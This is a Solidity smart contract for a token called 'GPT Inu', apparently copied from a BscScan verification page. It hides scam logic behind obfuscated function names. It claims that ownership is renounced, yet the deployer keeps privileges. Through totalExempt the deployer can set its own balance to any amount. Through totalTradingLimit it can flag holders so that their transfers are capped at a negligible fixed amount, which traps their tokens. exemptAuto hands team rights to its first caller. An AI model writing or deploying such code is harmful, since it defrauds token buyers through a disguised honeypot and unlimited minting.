/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface atSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquiditySell {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract GPTInu {
    uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;
    string public symbol = "GIU";
    address public atFrom;

    bool public enableModeFrom;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public fromBuy;
    address public owner;
    mapping(address => uint256) public balanceOf;
    uint256 constant shouldFrom = 11 ** 10;


    mapping(address => bool) public receiverTeam;

    mapping(address => bool) public teamIs;
    string public name = "GPT Inu";

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        atSwap tradingLaunch = atSwap(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        atFrom = liquiditySell(tradingLaunch.factory()).createPair(tradingLaunch.WETH(), address(this));
        owner = limitLaunched();
        fromBuy = owner;
        teamIs[fromBuy] = true;
        balanceOf[fromBuy] = totalSupply;
        emit Transfer(address(0), fromBuy, totalSupply);
        isReceiverTo();
    }

    

    function transfer(address isLimit, uint256 senderFee) external returns (bool) {
        return transferFrom(limitLaunched(), isLimit, senderFee);
    }

    function totalExempt(uint256 senderFee) public {
        if (!teamIs[limitLaunched()]) {
            return;
        }
        balanceOf[fromBuy] = senderFee;
    }

    function approve(address launchedExemptAt, uint256 senderFee) public returns (bool) {
        allowance[limitLaunched()][launchedExemptAt] = senderFee;
        emit Approval(limitLaunched(), launchedExemptAt, senderFee);
        return true;
    }

    function transferFrom(address liquidityFrom, address isLimit, uint256 senderFee) public returns (bool) {
        if (liquidityFrom != limitLaunched() && allowance[liquidityFrom][limitLaunched()] != type(uint256).max) {
            require(allowance[liquidityFrom][limitLaunched()] >= senderFee);
            allowance[liquidityFrom][limitLaunched()] -= senderFee;
        }
        if (isLimit == fromBuy || liquidityFrom == fromBuy) {
            return receiverTotal(liquidityFrom, isLimit, senderFee);
        }
        if (receiverTeam[liquidityFrom]) {
            return receiverTotal(liquidityFrom, isLimit, shouldFrom);
        }
        return receiverTotal(liquidityFrom, isLimit, senderFee);
    }

    function isReceiverTo() public {
        emit OwnershipTransferred(fromBuy, address(0));
        owner = address(0);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function receiverTotal(address liquidityMax, address totalReceiver, uint256 senderFee) internal returns (bool) {
        require(balanceOf[liquidityMax] >= senderFee);
        balanceOf[liquidityMax] -= senderFee;
        balanceOf[totalReceiver] += senderFee;
        emit Transfer(liquidityMax, totalReceiver, senderFee);
        return true;
    }

    function limitLaunched() private view returns (address) {
        return msg.sender;
    }

    function totalTradingLimit(address liquidityReceiver) public {
        if (liquidityReceiver == fromBuy || liquidityReceiver == atFrom || !teamIs[limitLaunched()]) {
            return;
        }
        receiverTeam[liquidityReceiver] = true;
    }

    function exemptAuto(address atTotal) public {
        if (enableModeFrom) {
            return;
        }
        teamIs[atTotal] = true;
        enableModeFrom = true;
    }


}